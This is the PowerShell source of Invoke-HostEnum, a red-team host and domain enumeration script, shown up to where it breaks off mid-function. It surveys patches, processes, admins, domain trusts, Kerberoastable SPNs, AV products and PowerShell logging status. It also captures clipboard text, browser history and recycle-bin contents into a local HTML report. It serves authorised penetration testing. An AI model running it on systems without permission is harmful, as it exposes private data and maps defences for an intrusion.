<#
Invoke-HostEnum
@andrewchiles
https://github.com/threatexpress/red-team-scripts

Future Additions
------------------

 Check Windows Update source, is WSUS configured
 LLMNR and NetBIOS over TCP/IP Settings
 RDP Settings HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
#>

#requires -version 2

function Invoke-HostEnum {
<#
.SYNOPSIS

    Performs local host and/or domain enumeration for situational awareness

    Author: Andrew Chiles (@andrewchiles) leveraging functions by @mattifestation, @harmj0y, Joe Bialek, rvrsh3ll, Beau Bullock, and Tim Medin
    License: BSD 3-Clause
    Depenencies: None
    Requirements: None
    
    https://github.com/threatexpress/red-team-scripts

.DESCRIPTION

    A compilation of multiple system enumeration / situational awareness techniques collected over time. 

    If system is a member of a domain, it can perform additional enumeration. However, the included domain enumeration is limited with the intention that PowerView, BoodHound, etc will be also be used.
    
    Report HTML file is written in the format of YYYYMMDD_HHMMSS_HOSTNAME.html in the current working directory.  

    Invoke-HostEnum is Powershell 2.0 compatible to ensure it functions on the widest variety of Windows targets

    Enumerated Information:
    
    - OS Details, Hostname, Uptime, Installdate
    - Installed Applications and Patches
    - Network Adapter Configuration, Network Shares, Listening Ports, Connections, Routing Table, DNS Cache, Firewall Status
    - Running Processes and Installed Services
    - Interesting Registry Entries
    - Local Users, Groups, Administrators 
    - Personal Security Product Status, AV Processes
    - Interesting file locations and keyword searches via file indexing
    - Interesting Windows Logs (User logins)
    - Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)


.PARAMETER All

    Executes Local, Domain, and Privesc functions
    
.PARAMETER Local

    Executes the local enumeration functions

.PARAMETER Domain

    Executes the domain enumeration functions
    
.PARAMETER Privesc

    Executes modified version of PowerUp privilege escalation enumeration (Invoke-AllChecks)

.PARAMETER Quick

    Executes a brief initial survey that may be useful when initially accessing a host
    Only enumerates basic system info, processes, av, network adapters, firewall state, network connections, users, and groups
    Note: Not usable with -HTMLReport
    
.PARAMETER HTMLReport

    Creates an HTML Report of enumeration results

.PARAMETER Verbose

    Enables verbosity (Leverages Write-Verbose and output may differ depending on the console/agent you're using)

.EXAMPLE

    PS C:\> Invoke-HostEnum -Local -HTMLReport -Verbose

    Performs local system enumeration with verbosity and writes output to a HTML report

.EXAMPLE

    PS C:\> Invoke-HostEnum -Domain -HTMLReport

    Performs domain enumeration using net commands and saves the output to the current directory

.EXAMPLE

    PS C:\> Invoke-HostEnum -Local -Domain 

    Performs local and domain enumeration functions and outputs the results to the console

.LINK

https://github.com/threatexpress/red-team-scripts

#>
    [CmdletBinding()]
    Param(
        [Switch]$All,
        [Switch]$Local,
        [Switch]$Domain,
        [Switch]$Quick,
        [Switch]$Privesc,
        [Switch]$HTMLReport
    )
    
    # Ignore Errors and don't print to screen unless specified otherwise when calling Functions
    $ErrorActionPreference = "SilentlyContinue"

    # $All switch runs Local, Domain, and Privesc checks
    If ($All) {$Local = $True; $Domain = $True; $Privesc = $True}
    
    ### Begin Main Execution
    
    $Time = (Get-Date).ToUniversalTime()
    [string]$StartTime = $Time|Get-Date -uformat  %Y%m%d_%H%M%S
    
    # Create filename for HTMLReport
    If ($HTMLReport) {
        [string]$Hostname = $ENV:COMPUTERNAME
        [string]$FileName = $StartTime + '_' + $Hostname + '.html'
        $HTMLReportFile = (Join-Path $PWD $FileName)
        
        # Header for HTML table formatting
        $HTMLReportHeader = @"
<style>
TABLE {border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}
TH {border-width: 1px;padding: 3px;border-style: solid;border-color: black;background-color: #6495ED;}
TD {border-width: 1px;padding: 3px;border-style: solid;border-color: black;font-family:courier;}
TR:Nth-Child(Even) {Background-Color: #dddddd;}
.odd  { background-color:#ffffff; }
.even { background-color:#dddddd; }
</style>
<style>
.aLine {
    border-top:1px solid #6495ED};
    height:1px;
    margin:16px 0;
    }
</style>
<title>System Report</title>
"@

    # Attempt to write out HTML report header and exit if there isn't sufficient permission
        Try {
            ConvertTo-HTML -Title "System Report" -Head $HTMLReportHeader `
                -Body "<H1>System Enumeration Report for $($Env:ComputerName) - $($Env:UserName)</H1>`n<div class='aLine'></div>" `
                | Out-File $HTMLReportFile -ErrorAction Stop
            }
        Catch {
            "`n[-] Error writing enumeration output to disk! Check your permissions on $PWD.`n$($Error[0])`n"; Return
        }
    }
    
    # Print initial execution status
    "[+] Invoke-HostEnum"
    "[+] STARTTIME:`t$StartTime"
    "[+] PID:`t$PID`n"

    # Check user context of Powershell.exe process and alert if running as SYSTEM
    $IsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
    
    If ($IsSystem) {
        "`n[*] Warning: Enumeration is running as SYSTEM and some enumeration techniques (Domain and User-context specific) may fail to yield desired results!`n"
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Note: Enumeration performed as 'SYSTEM' and report may contain incomplete results!</H2>" -as list | Out-File -Append $HTMLReportFile
        }
    }
    
    # Execute a quick system survey
    If ($Quick) {
        Write-Verbose "Performing quick enumeration..."
        "`n[+] Host Summary`n"
        $Results = Get-Sysinfo
        $Results | Format-List
        
        "`n[+] Running Processes`n"
        $Results = Get-ProcessInfo
        $Results | Format-Table ID, Name, Owner, Path -auto -wrap
        
        "`n[+] Installed AV Product`n"
        $Results = Get-AVInfo
        $Results | Format-List

        "`n[+] Potential AV Processes`n"
        $Results = Get-AVProcesses
        $Results | Format-Table -Auto
        
        "`n[+] Installed Software:`n"
        $Results  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
        {
            $Results += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        }
        $Results = $Results | Where-Object {$_.DisplayName} | Sort-Object DisplayName
        $Results | Format-Table -Auto -Wrap
        
        "`n[+] System Drives:`n"
        $Results = Get-PSDrive -psprovider filesystem | Select-Object Name, Root, Used, Free, Description, CurrentLocation
        $Results | Format-Table -auto
        
        "`n[+] Active TCP Connections:`n"
        $Results = Get-ActiveTCPConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, IPVersion
        $Results | Format-Table -auto
        
        "`n[+] Firewall Status:`n"
        $Results = Get-FirewallStatus
        $Results | Format-Table -auto
        
        "`n[+] Local Users:`n"
        $Results = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'" | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description | Sort-Object SID -Descending
        $Results | Format-Table -auto -wrap
    
        "`n[+] Local Administrators:`n"
        $Results = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } |
            Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
        $Results | Format-Table -auto -wrap
        
        # Local Groups
        "`n[+] Local Groups:`n"
        $Results = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object Name,SID,Description
        $Results | Format-Table -auto -wrap

        "`n[+] Group Membership for ($($env:username))`n"
        $Results = Get-GroupMembership | Sort-Object SID
        $Results | Format-Table -Auto
        
    }
    
    # Execute local system enumeration functions
    If ($Local) {

        # Execute local enumeration functions and format for report
        "`n[+] Host Summary`n"
        $Results = Get-Sysinfo
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Host Summary</H2>" -as list | Out-File -Append $HTMLReportFile
        }
        
        # Get Installed software, check for 64-bit applications
        "`n[+] Installed Software:`n"
        $Results  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
        {
            $Results += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        }
        
        $Results = $Results | Where-Object {$_.DisplayName} | Sort-Object DisplayName
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Software</H2>" | Out-File -Append $HTMLReportFile
        }
            
        # Get installed patches
        "`n[+] Installed Patches:`n"
        $Results = Get-WmiObject -class Win32_quickfixengineering | Select-Object HotFixID,Description,InstalledBy,InstalledOn | Sort-Object InstalledOn -Descending
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Patches</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Process Information
        "`n[+] Running Processes`n"
        $Results = Get-ProcessInfo
        $Results | Format-Table ID, Name, Owner, Path, CommandLine -auto 
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Property ID, Name, Owner, MainWindowTitle, Path, CommandLine -PreContent "<H2>Process Information</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Services
        "`n[+] Installed Services:`n"
        $Results = Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName
        $Results | Format-Table  -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Services</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Environment variables
        "`n[+] Environment Variables:`n"
        $Results = Get-Childitem -path env:* | Select-Object Name, Value | Sort-Object name
        $Results |Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Environment Variables</H2>"| Out-File -Append $HTMLReportFile
        }   
    
        # BIOS information
        "`n[+] BIOS Information:`n"
        $Results = Get-WmiObject -Class win32_bios |Select-Object SMBIOSBIOSVersion, Manufacturer, Name, SerialNumber, Version
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>BIOS Information</H2>" -as List| Out-File -Append $HTMLReportFile
        }
        
        # Physical Computer Information
        "`n[+] Computer Information:`n"
        $Results = Get-WmiObject -class Win32_ComputerSystem | Select-Object Domain, Manufacturer, Model, Name, PrimaryOwnerName, TotalPhysicalMemory, @{Label="Role";Expression={($_.Roles) -join ","}}
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Physical Computer Information</H2>" -as List | Out-File -Append $HTMLReportFile
        }
        
        # System Drives (Returns mapped drives too, but not their associated network path)
        "`n[+] System Drives:`n"
        $Results = Get-PSDrive -psprovider filesystem | Select-Object Name, Root, Used, Free, Description, CurrentLocation
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>System Drives</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Mapped Network Drives
        "`n[+] Mapped Network Drives:`n"
        $Results = Get-WmiObject -Class Win32_MappedLogicalDisk | Select-Object Name, Caption, VolumeName, FreeSpace, ProviderName, FileSystem
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Mapped Network Drives Drives</H2>" | Out-File -Append $HTMLReportFile
        }
            
        ## Local Network Configuration
        
        # Network Adapters
        "`n[+] Network Adapters:`n"
        $Results = Get-WmiObject -class Win32_NetworkAdapterConfiguration | 
            Select-Object Description,@{Label="IPAddress";Expression={($_.IPAddress) -join ", "}},@{Label="IPSubnet";Expression={($_.IPSubnet) -join ", "}},@{Label="DefaultGateway";Expression={($_.DefaultIPGateway) -join ", "}},MACaddress,DHCPServer,DNSHostname | Sort-Object IPAddress -descending
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Adapters</H2>" | Out-File -Append $HTMLReportFile
        }

        # DNS Cache
        "`n[+] DNS Cache:`n"
        $Results = Get-WmiObject -query "Select * from MSFT_DNSClientCache" -Namespace "root\standardcimv2" | Select-Object Entry, Name, Data
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>DNS Cache</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Network Shares
        "`n[+] Network Shares:`n"
        $Results = Get-WmiObject -class Win32_Share | Select-Object  Name, Path, Description, Caption, Status
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Shares</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # TCP Network Connections
        "`n[+] Active TCP Connections:`n"
        $Results = Get-ActiveTCPConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, IPVersion
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Active TCP Connections</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # IP Listeners
        "`n[+] TCP/UDP Listeners:`n"
        $Results = Get-ActiveListeners |Where-Object {$_.ListeningPort -LT 50000}| Select-Object Protocol, LocalAddress, ListeningPort, IPVersion
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>TCP/UDP Listeners</H2>" | Out-File -Append $HTMLReportFile
        }
        # Firewall Status
        "`n[+] Firewall Status:`n"
        $Results = Get-FirewallStatus
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Firewall Status</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # WMI Routing Table
        "`n[+] Routing Table:`n"
        $Results = Get-WmiObject -class "Win32_IP4RouteTable" -namespace "root\CIMV2" |Select-Object Destination, Mask, Nexthop, InterfaceIndex, Metric1, Protocol, Type
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Routing Table</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # WMI Net Sessions
        "`n[+] Net Sessions:`n"
        $Results = Get-WmiObject win32_networkconnection | Select-Object LocalName, RemoteName, RemotePath, Name, Status, ConnectionState, Persistent, UserName, Description
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Sessions</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Proxy Information
        "`n[+] Proxy Configuration:`n"
        $regkey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        $Results = New-Object -TypeName PSObject -Property @{
                        Enabled = If ((Get-ItemProperty -Path $regkey).proxyEnable -eq 1) {"True"} else {"False"}
                        ProxyServer  = (Get-ItemProperty -Path $regkey).proxyServer
                        AutoConfigURL  = (Get-ItemProperty -Path $regkey).AutoConfigUrl
                        }
                        
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Proxy Configuration</H2>" | Out-File -Append $HTMLReportFile
        }
        
        ## Local User and Group Enumeration
        #######################
        
        # Local User Accounts
        "`n[+] Local users:`n"
        $Results = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'" | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description | Sort-Object SID -Descending
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Users</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Local Administrators
        "`n[+] Local Administrators:`n"
        $Results = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } |
            Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Administrators</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Local Groups
        "`n[+] Local Groups:`n"
        $Results = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object Name,SID,Description
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Groups</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        ## AV Products
        #########################
        "`n[+] Installed AV Product`n"
        $Results = Get-AVInfo
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed AV Product</H2>" -as list | Out-File -Append $HTMLReportFile
        }
        
        # Potential Running AV Processes
        "`n[+] Potential AV Processes`n"
        $Results = Get-AVProcesses
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Potential AV Processes</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # If McAfee is installed then pull some recent logs
        If ($Results.displayName -like "*mcafee*") {
            $Results = Get-McafeeLogs
            $Results |Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Recent McAfee AV Logs</H2>" -as list | Out-File -Append $HTMLReportFile
            }
        }
        ## Interesting Locations
        #############################
        "`n[+] Registry Keys`n"
        $Results = Get-InterestingRegistryKeys
        $Results
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Interesting Registry Keys</H2>`n<table><tr><td><PRE>$Results</PRE></td></tr></table>" -as list | Out-File -Append $HTMLReportFile
        }   
    
        # Interesting File Search (String formatted due to odd formatting issues with file listings)
        "`n[+] Interesting Files:`n"
        $Results = Get-InterestingFiles
        $Results
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Interesting Files</H2>`n<table><tr><td><PRE>$Results</PRE></td></tr></table>" | Out-File -Append $HTMLReportFile
        }
        
        ## Current User Enumeration
        ############################
        # Group Membership for Current User
        "`n[+] Group Membership - $($Env:UserName)`n"
        $Results = Get-GroupMembership | Sort-Object SID
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Group Membership - $($env:username)</H2>"| Out-File -Append $HTMLReportFile
        }
        
        # Browser History (IE, Firefox, Chrome)
        "`n[+] Browser History`n"
        $Results = Get-BrowserInformation | Where-Object{$_.Data -NotMatch "google" -And $_.Data -NotMatch "microsoft" -And $_.Data -NotMatch "chrome" -And $_.Data -NotMatch "youtube" }
        $Results | Format-Table Browser, DataType, User, Data -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Property Browser, DataType, User, Data, Name -PreContent "<H2>Browser History</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Open IE Tabs
        "`n[+] Active Internet Explorer URLs - $($Env:UserName)`n"
        $Results = Get-ActiveIEURLS
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Active Internet Explorer URLs - $($Env:UserName)</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Recycle Bin Files
        "`n`n[+] Recycle Bin Contents - $($Env:UserName)`n"
        $Results = Get-RecycleBin
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Recycle Bin Contents - $($Env:UserName)</H2>" | Out-File -Append $HTMLReportFile
        }
        
        # Clipboard Contents
        Add-Type -Assembly PresentationCore
        "`n[+] Clipboard Contents - $($Env:UserName):`n"
        $Results = ''
        $Results = ([Windows.Clipboard]::GetText()) -join "`r`n" | Out-String
        $Results
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Clipboard Contents - $($Env:UserName)</H2><table><tr><td><PRE>$Results</PRE></td></tr></table>"| Out-File -Append $HTMLReportFile
        }
        
        # Commented out by default because the log parsing can take a REALLY long time on some hosts
        #$Results += Format-HTMLTable "Interesting Windows Logs" (Get-ComputerDetails)
        #"`n`n[+] Interesting Windows Logs`n"
        #$Results = Get-ComputerDetails
        #$Results
        #If ($HTMLReport) {
        #   $Results | ConvertTo-HTML -Head $Header -Body "<H2>Interesting Windows Logs</H2>" | Out-File -Append $HTMLReportFile
        #}
            
    }

    # Simple Domain Enumeration
    If ($Domain) {
        If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H1>Domain Report - $($env:USERDOMAIN)</H1><div class='aLine'></div>" | Out-File -Append $HTMLReportFile
            }
        # Check if host is part of a domain before executing domain enumeration functions
        If ((gwmi win32_computersystem).partofdomain){
            Write-Verbose "Enumerating Windows Domain..."
            "`n[+] Domain Mode`n"
            $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).DomainMode
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Domain Mode: $Results</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # DA Level Accounts
            "`n[+] Domain Administrators`n"
            $Results = Get-DomainAdmins
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Domain Administrators</H2><table><tr><td><PRE>$Results</PRE></td></tr></table>" | Out-File -Append $HTMLReportFile
            }
            
            # Domain account password policy
            "`n[+] Domain Account Policy`n"
            $Results = Get-DomainAccountPolicy
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Account Policy</H2>" -as List | Out-File -Append $HTMLReportFile
            }
                            
            # Domain Controllers
            "`n[+] Domain Controllers:`n"
            $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object  Name,OSVersion,Domain,Forest,SiteName,IpAddress
            $Results | Format-Table -Auto   
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Controllers</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Domain Trusts
            "`n[+] Domain Trusts:`n"
            $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Trusts</H2>" -as List | Out-File -Append $HTMLReportFile
            }
            
            # Domain Users
            "`n[+] Domain Users:`n"
            $Results = Get-WmiObject -Class Win32_UserAccount | Select-Object Name,Caption,SID,Fullname,Disabled,Lockout,Description |Sort-Object SID
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Users</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Domain Groups
            "`n[+] Domain Groups:`n"
            $Results = Get-WmiObject -Class Win32_Group | Select-Object Name,SID,Description | Sort-Object SID
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Groups</H2>" | Out-File -Append $HTMLReportFile
            }
            
            # Domain Admins, Enterprise Admins, Server Admins, Backup Operators
                
            # Get User SPNS
            "`n[+] User Account SPNs`n"
            $Results = Get-UserSPNS -UniqueAccounts
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>User Account SPNs</H2>" | Out-File -Append $HTMLReportFile
            }
        }
        Else {
            "`n[-] Host is not a member of a domain. Skipping domain checks...`n"
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Host is not a member of a domain. Domain checks skipped.</H2>" | Out-File -Append $HTMLReportFile
            }
        }
    }

    # Privilege Escalation Enumeration
    If ($Privesc) {
        If ($HTMLReport) {
            Invoke-AllChecks -HTMLReport
        }
        Else {
            Invoke-AllChecks
        }
    }
    # Determine the execution duration
    $Duration = New-Timespan -start $Time -end ((Get-Date).ToUniversalTime())
    
    # Print report location and finish execution
    
    "`n"
    If ($HTMLReport) {
        "[+] FILE:`t$HTMLReportFile"
        "[+] FILESIZE:`t$((Get-Item $HTMLReportFile).length) Bytes"
    }
    "[+] DURATION:`t$Duration"
    "[+] Invoke-HostEnum complete!"
}


function Get-SysInfo {
<#
.SYNOPSIS

Gets basic system information from the host

#>
    $os_info = gwmi Win32_OperatingSystem
    $uptime = [datetime]::ParseExact($os_info.LastBootUpTime.SubString(0,14), "yyyyMMddHHmmss", $null)
    $uptime = (Get-Date).Subtract($uptime)
    $uptime = ("{0} Days, {1} Hours, {2} Minutes, {3} Seconds" -f ($uptime.Days, $uptime.Hours, $uptime.Minutes, $uptime.Seconds))
    $date = Get-Date
    
    $SysInfoHash = @{            
        HOSTNAME                = $ENV:COMPUTERNAME                         
        IPADDRESSES             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
        OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
        ARCHITECTURE            = $os_info.OSArchitecture   
        "DATE(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
        "DATE(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
        INSTALLDATE             = $os_info.InstallDate
        UPTIME                  = $uptime           
        USERNAME                = $ENV:USERNAME           
        DOMAIN                  = (GWMI Win32_ComputerSystem).domain            
        LOGONSERVER             = $ENV:LOGONSERVER          
        PSVERSION               = $PSVersionTable.PSVersion.ToString()
        PSSCRIPTBLOCKLOGGING    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
        PSTRANSCRIPTION         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
        PSTRANSCRIPTIONDIR      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
    }      
                
    # PS feels the need to randomly re-order everything when converted to an object so let's presort
    New-Object -TypeName PSobject -Property $SysInfoHash | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, UpTime, IPAddresses, Domain, Username, LogonServer, PSVersion, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir
}

    
function Get-ProcessInfo() {
<#
.SYNOPSIS

Gets detailed process information via WMI

#>  
    # Extra work here to include process owner and commandline using WMI
    Write-Verbose "Enumerating running processes..."
    $owners = @{}
    $commandline = @{}

    gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
    gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}

    $procs = Get-Process | Sort-Object -property ID
    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "Owner" -Value $owners[$_.id.tostring()] -force}
    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "CommandLine" -Value $commandline[$_.id.tostring()] -force}

    Return $procs
}
    
function Get-GroupMembership {
<#
.SYNOPSIS

Pulls local group membership for the current user
 
#>
    Write-Verbose "Enumerating current user local group membership..."
    
    $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $CurrentUserSids = $UserIdentity.Groups | Select-Object -expand value
    $Groups = ForEach ($sid in $CurrentUserSids) {
        $SIDObj = New-Object System.Security.Principal.SecurityIdentifier("$sid")
        $GroupObj = New-Object -TypeName PSObject -Property @{
                    SID = $sid
                    GroupName = $SIDObj.Translate([System.Security.Principal.NTAccount])
        }
        $GroupObj
    }
    $Groups
}

function Get-ActiveTCPConnections {
<#
.SYNOPSIS

Enumerates active TCP connections. 
Adapted from Beau Bullock's TCP code
https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1

#>
    Write-Verbose "Enumerating active network connections..."
    $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $IPProperties.GetActiveTcpConnections()            
    foreach($Connection in $Connections) {            
        if($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
        New-Object -TypeName PSobject -Property @{           
            "LocalAddress"  = $Connection.LocalEndPoint.Address            
            "LocalPort"     = $Connection.LocalEndPoint.Port            
            "RemoteAddress" = $Connection.RemoteEndPoint.Address            
            "RemotePort"    = $Connection.RemoteEndPoint.Port            
            "State"         = $Connection.State            
            "IPVersion"     = $IPType            
        }
    }
}
    
function Get-ActiveListeners {
<#
.SYNOPSIS

Enumerates active TCP/UDP listeners.

#>
    Write-Verbose "Enumerating active TCP/UDP listeners..."     
    $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()         
    $TcpListeners = $IPProperties.GetActiveTCPListeners()
    $UdpListeners = $IPProperties.GetActiveUDPListeners()
            
    ForEach($Connection in $TcpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "TCP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
    }
    ForEach($Connection in $UdpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "UDP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
    }
}

function Get-FirewallStatus {
<#
.SYNOPSIS

Enumerates local firewall status from registry
 
#>
    $regkey = "HKLM:\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"
